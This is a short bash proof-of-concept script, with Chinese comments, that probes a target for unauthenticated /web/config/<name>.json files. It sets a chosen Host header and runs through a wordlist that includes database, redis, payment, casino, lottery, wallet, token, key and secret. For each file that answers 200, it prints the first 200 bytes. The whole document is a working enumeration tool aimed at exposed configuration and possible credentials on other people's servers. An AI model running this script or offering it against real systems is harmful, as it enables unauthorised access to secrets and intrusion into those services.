#!/bin/bash
# /web/config/<name>.json 未鉴权枚举（只读 GET，不写）
# ---- 参数检查 ----
if [ $# -lt 2 ]; then printf '用法: ./poc.sh <TARGET> <HOST>\n' >&2; exit 1; fi
T=${1:?target}; H=${2:?host}
NAMES="common aio-download config site app api db database mysql redis server
global setting settings admin system pay payfast channel merchant agent
sport casino live lottery game hall tpl template version env prod test
sms mail oss cdn upload img default base basic info index main online
wallet finance order member user auth login token key secret"

for n in $NAMES; do
  for p in "/web/config/$n.json" "/web/config/$n" "/web/config/${n}/${n}.json"; do
    code=$(curl -s -o /tmp/o.$$ -w '%{http_code} %{size_download} %{content_type}' \
      -H "Host: $H" "$T$p" --max-time 12)
    set -- $code
    # 只要 200，且体不是 SPA 外壳
    if [ "$1" = "200" ] && ! grep -qi '<!doctype html' /tmp/o.$$ 2>/dev/null; then
      echo "HIT $p  code=$1 size=$2 ct=$3"
      head -c 200 /tmp/o.$$ | tr -d '\n'; echo; echo '---'
    else
      echo "miss $p  code=$1 size=$2"
    fi
    sleep 0.6
  done
done
rm -f /tmp/o.$$
